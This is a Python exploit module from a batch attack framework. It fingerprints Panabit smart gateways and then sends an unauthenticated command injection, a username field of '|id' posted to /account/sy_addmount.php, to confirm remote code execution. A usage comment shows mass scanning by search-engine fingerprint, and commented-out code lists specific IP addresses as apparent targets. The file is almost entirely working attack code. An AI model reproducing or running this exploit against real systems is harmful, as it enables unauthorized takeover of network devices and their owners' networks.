# coding=utf-8
# @Author   : zpchcbd HG team
# @blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-11-19 16:33

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# python batch.py -m exploit.web.Gateway.Panabit.unauth_rce -cs -fs "app=\"Panabit-智能网关\""

class Script(BaseScript):
    name = 'Panabit Gateway'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'None'
        # 来源
        self.refer = 'http://vulhub.org.cn/vuln/VHN-397199'
        # 特定路径判断
        self.detectPathList = ['/login/login.htm']
        # exec
        self.execPathList = ['/account/sy_addmount.php']
        # session
        self.session = session
        # 相关信息
        self.info = 'Panabit 智能网关'

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout,
                                            verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if '/login/userverify.cgi' in text:
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Panabit Finger', url))
                            return {'name': 'Panabit Finger', 'url': url, 'software': 'Panabit'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = {'username': '|id'}
                async with self.session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'uid=' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Panabit RCE', url))
                            return {'name': 'Panabit RCE', 'url': url, 'software': 'Panabit'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('http://111.21.158.85:8085/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
